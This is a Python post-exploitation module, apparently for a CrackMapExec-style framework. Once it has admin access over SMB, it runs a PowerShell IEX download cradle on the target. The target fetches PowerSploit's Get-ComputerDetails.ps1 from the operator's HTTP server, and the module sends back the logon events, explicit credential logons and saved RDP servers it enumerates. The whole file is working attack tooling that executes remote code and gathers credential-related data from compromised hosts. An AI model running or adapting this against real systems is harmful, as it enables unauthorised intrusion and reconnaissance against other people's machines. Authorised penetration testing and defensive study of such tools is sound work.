from cmx.helpers.powershell import *
from cmx.helpers.logger import write_log, highlight
from datetime import datetime
from io import StringIO
import pdb

class CMXModule:
    '''
        Executes Get-ComputerDetails.ps1 script
        
        Executes PowerSploit's Get-ComputerDetails.ps1 script 
        which enumerates information such as: 
            Explicit Credential Logons, 
            Logon events, 
            RDP Client Saved Servers etc.
        
        Original Module by @mishradhiraj_
        Update by @awsmhacks

    '''

    name = 'getcompdetails'
    description = "Enumerates sysinfo"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def  options(self, context, module_options):
        '''
    Module Options:
           N/A
        '''

        self.inject = False
#        if 'INJECT' in module_options:
#            self.inject = bool(module_options['INJECT'])
        
        self.ps_script = clean_ps_script('powershell_scripts/Get-ComputerDetails.ps1')

    def on_admin_login(self, context, connection):
        command = 'Get-ComputerDetails -ToString | Out-String'

        launcher = gen_ps_iex_cradle(context, 'Get-ComputerDetails.ps1', command, server_os=connection.server_os)

        connection.ps_execute(launcher)

        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Get-ComputerDetails.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script.encode())

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('Content-Length'))
        data = response.rfile.read(length)

        response.stop_tracking_host()

        if len(data):
            #buf = StringIO(data).readlines()
            lines = data.decode().split("             ")
            #pdb.set_trace()
            for line in lines:
                #line = line.replace('\r\n', '\n').strip()
                context.log.results(line)